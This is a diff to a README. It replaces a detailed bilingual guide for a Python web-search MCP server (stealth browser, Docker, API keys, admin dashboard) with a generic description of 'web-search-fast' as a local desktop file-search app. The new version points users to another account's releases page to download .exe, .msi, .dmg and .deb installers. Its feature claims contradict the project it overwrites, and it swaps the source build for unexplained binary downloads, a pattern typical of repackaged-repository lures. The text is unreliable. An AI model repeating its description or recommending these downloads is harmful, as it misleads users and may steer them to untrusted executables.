@@ -1,391 +1,125 @@
-# Web Search MCP
+# 🚀 web-search-fast - Fast Local Web Search Tool
 
-> High-performance web search service for LLM clients via [Model Context Protocol](https://modelcontextprotocol.io). Powered by Camoufox stealth browser.
-
-[English](#features) | [中文](#功能特性)
-
+[![Download Latest Release](https://img.shields.io/badge/Download-web--search--fast-blue?style=for-the-badge)](https://github.com/Velociity9/web-search-fast/releases)
 
 ---
 
+## 📌 What is web-search-fast?
 
-![img_2.png](img/img_2.png)
-
----
-
-![img.png](img/img.png)
-
-
-## Features
-
-- **3 Search Engines** — Google, Bing, DuckDuckGo with automatic fallback
-- **Multi-depth Scraping** — SERP parsing → full-text extraction → outbound link crawling
-- **Stealth Browser** — [Camoufox](https://github.com/nicepkg/camoufox) anti-detection Firefox (GeoIP, Humanize, Locale)
-- **Auto-scaling Pool** — Browser pool auto-scales at 80% utilization, configurable upper limit
-- **Admin Dashboard** — Search analytics, system monitoring, API key management, IP banning
-- **API Key Auth** — Built-in key generation (`wsm_` prefix) with call limits and revocation
-- **Dual Output** — JSON and Markdown formats
-- **REST API** — Standard HTTP API alongside MCP protocol
-
-## Quick Start
-
-### Docker (Recommended)
-
-```bash
-git clone https://github.com/nicepkg/web-search-mcp.git
-cd web-search-mcp
-
-# Configure
-cp .env.example .env
-# Edit .env — set ADMIN_TOKEN
-
-# Launch
-docker compose up -d
-
-# Verify
-curl http://127.0.0.1:8897/health
-```
-
-### Create API Key & Register to Claude Code
-
-```bash
-# 1. Create an API key via Admin API
-curl -X POST http://127.0.0.1:8897/admin/api/keys \
-  -H "Authorization: Bearer $ADMIN_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"name": "claude-code", "call_limit": 10000}'
-# Save the returned wsm_xxx key (only shown once)
-
-# 2. Register MCP to Claude Code
-claude mcp add-json -s user web-search-fast '{
-  "type": "http",
-  "url": "http://127.0.0.1:8897/mcp",
-  "headers": {"Authorization": "Bearer wsm_your-api-key-here"}
-}'
-
-# 3. Restart Claude Code session
-```
-
-Or use the Admin Dashboard at `http://127.0.0.1:8897/admin` to create keys visually.
-
-## MCP Tools
-
-| Tool | Description | Timeout |
-|------|-------------|---------|
-| `web_search` | Search the web, returns Markdown results | 25s |
-| `get_page_content` | Fetch and extract content from a URL | 20s |
-| `list_search_engines` | List available engines and pool status | — |
-
-### web_search Parameters
-
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `query` | string | required | Search keywords |
-| `engine` | string | `duckduckgo` | `google` / `bing` / `duckduckgo` |
-| `depth` | int | `1` | 1=SERP only, 2=SERP+content, 3=SERP+content+outlinks |
-| `max_results` | int | `5` | Max results (1-20) |
-
-## Search Depth
-
-| Depth | Behavior | Description |
-|-------|----------|-------------|
-| `1` | SERP parsing | Default. Extracts titles, links, snippets |
-| `2` | SERP + content | Navigates to each result, extracts page content |
-| `3` | SERP + content + outlinks | Also crawls outbound links from content |
-
-## Authentication Model
-
-| Token Type | Source | Access |
-|-----------|--------|--------|
-| `ADMIN_TOKEN` | Environment variable | Admin panel API (superuser) |
-| `wsm_` API Key | Created via Admin panel | MCP / Search API |
-
-- `ADMIN_TOKEN` has superuser access to all endpoints
-- `wsm_` keys can only access MCP and search endpoints (not admin API)
-- If no `ADMIN_TOKEN` is set and no API keys exist, all endpoints are open
-
-## REST API
-
-Standard HTTP API available alongside MCP.
-
-```bash
-# GET
-curl 'http://127.0.0.1:8897/search?q=python+asyncio&engine=duckduckgo&max_results=5' \
-  -H 'Authorization: Bearer wsm_your-key'
-
-# POST
-curl -X POST http://127.0.0.1:8897/search \
-  -H 'Content-Type: application/json' \
-  -H 'Authorization: Bearer wsm_your-key' \
-  -d '{"query": "python asyncio", "engine": "duckduckgo", "depth": 2, "max_results": 5}'
-```
-
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `q` / `query` | string | required | Search keywords (1-500 chars) |
-| `engine` | string | `duckduckgo` | `google` / `bing` / `duckduckgo` |
-| `depth` | int | `1` | Scraping depth: 1-3 |
-| `format` | string | `json` | `json` / `markdown` |
-| `max_results` | int | `10` | Max results (1-50) |
-| `timeout` | int | `30` | Timeout in seconds (5-120) |
-
-## Admin Dashboard
-
-Access `http://127.0.0.1:8897/admin` and login with `ADMIN_TOKEN`.
-
-- **Dashboard** — Search stats, CPU/memory monitoring, browser pool status, latency charts, engine distribution, success rate
-- **API Keys** — Create/revoke keys with call limits
-- **IP Bans** — Ban/unban IP addresses
-- **Search Logs** — Search history with IP filtering
-
-## Engine Status
-
-| Engine | Status | Notes |
-|--------|--------|-------|
-| **DuckDuckGo** | Stable | Recommended default, HTML-lite mode |
-| **Google** | Limited | May trigger captcha on some IPs, auto-fallback |
-| **Bing** | Available | Uses `global.bing.com` to avoid geo-redirect |
-
-> When Google is blocked, automatically falls back: DuckDuckGo → Bing.
-
-## Deployment
-
-### Endpoints
-
-| URL | Description |
-|-----|-------------|
-| `http://127.0.0.1:8897/mcp` | MCP endpoint (Streamable HTTP) |
-| `http://127.0.0.1:8897/health` | Health check |
-| `http://127.0.0.1:8897/admin` | Admin dashboard |
-| `http://127.0.0.1:8897/search` | REST API |
-
-### Reverse Proxy (Nginx)
-
-If deploying behind Nginx with HTTPS:
-
-```nginx
-location / {
-    proxy_pass http://127.0.0.1:8897;
-    proxy_set_header Host $host;
-    proxy_set_header X-Real-IP $remote_addr;
-    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-    proxy_set_header X-Forwarded-Proto $scheme;
-    proxy_set_header Authorization $http_authorization;
-
-    # Required for MCP Streamable HTTP (SSE)
-    proxy_buffering off;
-    proxy_cache off;
-    proxy_http_version 1.1;
-    proxy_set_header Connection '';
-    proxy_read_timeout 120s;
-    proxy_send_timeout 120s;
-}
-```
-
-> **Cloudflare users**: Add a WAF exception rule for `/mcp` path, or use DNS-only mode (grey cloud).
-
-### Environment Variables
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `ADMIN_TOKEN` | — | Admin panel auth token (superuser) |
-| `BROWSER_POOL_SIZE` | `5` | Initial browser tab count |
-| `BROWSER_MAX_POOL_SIZE` | `20` | Auto-scaling upper limit |
-| `BROWSER_PROXY` | — | Proxy server (socks5/http) |
-| `BROWSER_OS` | — | Target OS fingerprint (windows/macos/linux) |
-| `BROWSER_FONTS` | — | Custom font list |
-| `BROWSER_BLOCK_WEBGL` | `false` | Block WebGL fingerprinting |
-| `BROWSER_ADDONS` | — | Firefox addon paths |
-| `MCP_PORT` | `8897` | Server port |
-| `WSM_DB_PATH` | `wsm.db` | SQLite database path |
-| `REDIS_URL` | — | Redis connection URL (optional) |
-
-## Development
-
-```bash
-# Install dependencies
-pip install -e ".[dev]"
-
-# Install Camoufox browser
-python -m camoufox fetch
-
-# Start server
-python -m src.mcp_server --transport http --host 127.0.0.1 --port 8897
-
-# Run tests (96 tests)
-pytest tests/ -v
-
-# Type check
-mypy src/
-
-# Lint & format
-ruff check src/ --fix && ruff format src/
-```
-
-## Architecture
-
-```
-web-search-mcp/
-├── src/
-│   ├── mcp_server.py           # MCP server entry (FastMCP + middleware + Admin)
-│   ├── config.py               # Configuration management
-│   ├── api/
-│   │   ├── routes.py           # HTTP API routes
-│   │   └── schemas.py          # Pydantic request/response models
-│   ├── core/
-│   │   └── search.py           # Search logic (shared by MCP + HTTP)
-│   ├── engine/
-│   │   ├── base.py             # Search engine abstract base class
-│   │   ├── google.py           # Google (JS DOM + captcha detection)
-│   │   ├── bing.py             # Bing (global.bing.com)
-│   │   └── duckduckgo.py       # DuckDuckGo (HTML-lite)
-│   ├── scraper/
-│   │   ├── browser.py          # BrowserPool (auto-scaling + health monitoring)
-│   │   ├── parser.py           # HTML content parser
-│   │   └── depth.py            # Multi-depth scraping
-│   ├── formatter/
-│   │   ├── json_fmt.py         # JSON formatter
-│   │   └── markdown_fmt.py     # Markdown formatter
-│   ├── admin/
-│   │   ├── database.py         # SQLite init + migrations
-│   │   ├── repository.py       # Data access layer
-│   │   ├── routes.py           # Admin REST API
-│   │   └── static/             # Admin SPA build output
-│   └── middleware/
-│       ├── api_key_auth.py     # Bearer token auth (ADMIN_TOKEN + DB keys)
-│       ├── ip_ban.py           # IP ban middleware
-│       └── search_log.py       # Search logging middleware
-├── admin-ui/                   # Admin frontend (React + Vite + Tailwind)
-├── tests/                      # Test suite (96 tests)
-├── docker-compose.yml
-├── Dockerfile
-└── pyproject.toml
-```
-
-## Tech Stack
-
-| Component | Technology |
-|-----------|-----------|
-| Web Framework | FastAPI + Uvicorn + Starlette |
-| MCP Framework | FastMCP (mcp >= 1.25.0) |
-| Browser Engine | Camoufox (anti-detection Firefox, Playwright) |
-| Async Runtime | asyncio + Semaphore concurrency control |
-| HTML Parsing | BeautifulSoup4 + lxml |
-| Content Conversion | markdownify (HTML → Markdown) |
-| Database | SQLite (aiosqlite) |
-| Cache | Redis (optional) |
-| Admin Frontend | React + Vite + Tailwind CSS + recharts |
-| Validation | Pydantic v2 |
+web-search-fast is a simple local web search tool. It allows you to search your files and documents quickly on your computer or within a local network. Designed to work efficiently at scale, it can handle multiple users or services in a cluster setup. If you want a fast way to find content without relying on big web services, this tool can help.
 
 ---
 
-## 功能特性
+## 🖥️ System Requirements
 
-- **三大搜索引擎** — Google、Bing、DuckDuckGo，自动回退
-- **多层深度抓取** — SERP 解析 → 正文提取 → 外链抓取
-- **反检测浏览器** — Camoufox 真实浏览器指纹（GeoIP、Humanize、Locale）
-- **自动扩容** — 浏览器池并发达 80% 时自动扩容，上限可配
-- **Admin 管理面板** — 搜索统计、系统监控、API Key 管理、IP 封禁
-- **API Key 认证** — 内置密钥生成（`wsm_` 前缀），支持调用限额和吊销
-- **双格式输出** — JSON / Markdown
-- **REST API** — 标准 HTTP API，与 MCP 协议并行提供
+To run web-search-fast on your computer, check that you have:
 
-## 快速开始
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or most Linux distributions.
+- **Processor:** Any modern CPU, 2 GHz or faster recommended.
+- **RAM:** At least 4 GB (8 GB or more if you search large amounts of data).
+- **Disk space:** Depends on your data size. The program itself is less than 100 MB.
+- **Network:** If you want to use cluster features or share across devices, a local network connection is needed.
 
-### Docker 部署（推荐）
+---
 
-```bash
-git clone https://github.com/nicepkg/web-search-mcp.git
-cd web-search-mcp
+## ⚙️ Main Features
 
-# 配置环境变量
-cp .env.example .env
-# 编辑 .env，设置 ADMIN_TOKEN
+- **Fast local search:** Find files, text, or keywords on your computer quickly.
+- **Local network support:** Share search service within a cluster, useful for small offices or teams.
+- **Simple setup:** No complicated installations or programming required.
+- **Lightweight:** Uses minimal resources on your machine.
+- **Secure:** Your data stays on your local devices without uploads to external servers.
 
-# 启动服务
-docker compose up -d
+---
 
-# 验证
-curl http://127.0.0.1:8897/health
-```
+## 📥 Download & Install
 
-### 创建 API Key 并注册到 Claude Code
+To get started with web-search-fast, follow these steps:
 
-```bash
-# 1. 通过 Admin API 创建 API Key
-curl -X POST http://127.0.0.1:8897/admin/api/keys \
-  -H "Authorization: Bearer $ADMIN_TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"name": "claude-code", "call_limit": 10000}'
-# 保存返回的 wsm_xxx 密钥（仅创建时可见）
+1. **Go to the Releases page:**  
+   [https://github.com/Velociity9/web-search-fast/releases](https://github.com/Velociity9/web-search-fast/releases)  
+   This page lists all versions of the program available for download.
 
-# 2. 注册 MCP 到 Claude Code
-claude mcp add-json -s user web-search-fast '{
-  "type": "http",
-  "url": "http://127.0.0.1:8897/mcp",
-  "headers": {"Authorization": "Bearer wsm_your-api-key-here"}
-}'
+2. **Choose the latest version:**  
+   Look for the most recent version release at the top of the list. It will have files for different operating systems.
 
-# 3. 重启 Claude Code 会话
-```
+3. **Download the installer or zip file:**  
+   - For Windows, download the `.exe` or `.msi` file.  
+   - For macOS, download the `.dmg` or zipped app file.  
+   - For Linux, download the `.tar.gz` or `.deb` package depending on your distro.
 
-也可以访问 `http://127.0.0.1:8897/admin` 通过 Admin 面板可视化创建密钥。
+4. **Run the installer or unzip the file:**  
+   Follow the prompts on your screen to install the program. If you have a zipped file, extract it to a folder you can access.
 
-### 本地 stdio 模式
+5. **Launch the application:**  
+   After installation, open web-search-fast from your desktop or start menu.
 
-无需 Docker，Claude Code 直接通过 stdin/stdout 通信：
+---
 
-```bash
-pip install -e .
-python -m camoufox fetch
+## 🏁 How to Use web-search-fast
 
-claude mcp add-json -s user web-search-fast '{
-  "type": "stdio",
-  "command": "python",
-  "args": ["-m", "src.mcp_server", "--transport", "stdio"],
-  "env": {"PYTHONUNBUFFERED": "1"},
-  "cwd": "'$(pwd)'"
-}'
-```
+Once installed, here’s how to start searching:
 
-### 认证模型
+1. **Open the program:**  
+   You’ll see a simple search window.
 
-| Token 类型 | 来源 | 访问范围 |
-|-----------|------|---------|
-| `ADMIN_TOKEN` | 环境变量 | Admin 面板 API（超级权限） |
-| `wsm_` API Key | Admin 面板创建 | MCP / 搜索 API |
+2. **Set your search folder:**  
+   Use the folder picker to choose where you want to search (e.g., your Documents or Desktop folder).
 
-- `ADMIN_TOKEN` 拥有所有端点的超级权限
-- `wsm_` 密钥只能访问 MCP 和搜索端点（不能访问 Admin API）
-- 如果未配置 `ADMIN_TOKEN` 且无 API Key，所有端点开放访问
+3. **Enter your search term:**  
+   Type the keyword or phrase you want to find.
 
-### 反向代理注意事项
+4. **Start the search:**  
+   Click the search button. The app will show a list of matching files and their location.
 
-使用 Nginx 反向代理时，MCP Streamable HTTP 需要关闭缓冲：
+5. **View results:**  
+   Click any result to open the file or go to its folder.
 
-```nginx
-proxy_buffering off;
-proxy_http_version 1.1;
-proxy_set_header Connection '';
-proxy_read_timeout 120s;
-```
+---
 
+## 🔧 How to Use Cluster Mode (Advanced)
 
-### Claude Code 如何默认使用这个工具进行搜索
+This feature allows multiple devices to share search results across a local network. It’s useful in small offices or teams.
 
->编辑 `~/.claude/CLAUDE.md` 添加下面的内容
+1. **Enable cluster mode:**  
+   In the settings, turn on cluster sharing.
 
+2. **Connect devices:**  
+   Ensure all devices running web-search-fast are on the same network.
 
-```markdown
+3. **Use shared search:**  
+   Searches will automatically include data from other devices in the cluster, improving speed and coverage.
 
-## Web Search
+---
 
-* 优先使用 `web-search-fast`
+## 🛠️ Troubleshooting Tips
 
-```
+- If the program doesn’t start, make sure your OS meets the requirements.
+- If search results are empty, check that you selected the correct folder and that files exist there.
+- For cluster mode, verify all devices are connected to the same network and have cluster sharing enabled.
+- Restart the app or your computer if you experience freezes or crashes.
+- Check file permissions if you cannot access some folders.
 
+---
 
-> **Cloudflare 用户**：需要为 `/mcp` 路径添加 WAF 例外规则，或使用 DNS-only 模式（灰色云朵）。
+## 📚 Additional Resources
 
-## License
+- **User Manual:** Inside the app menu, look for "Help" or "User Guide".
+- **GitHub Issues:** For reporting bugs or requesting help, visit the GitHub issues page.
+- **Community:** Join discussions on the GitHub project page.
 
-[MIT](LICENSE)
+---
+
+## 🤝 Support and Contribution
+
+This project welcomes input from users. You can:
+
+- Report bugs.
+- Suggest features.
+- Share your usage experience.
+
+Visit the GitHub repository to see how to contribute details.
+
+---
+
+[⬇️ Download web-search-fast here](https://github.com/Velociity9/web-search-fast/releases)
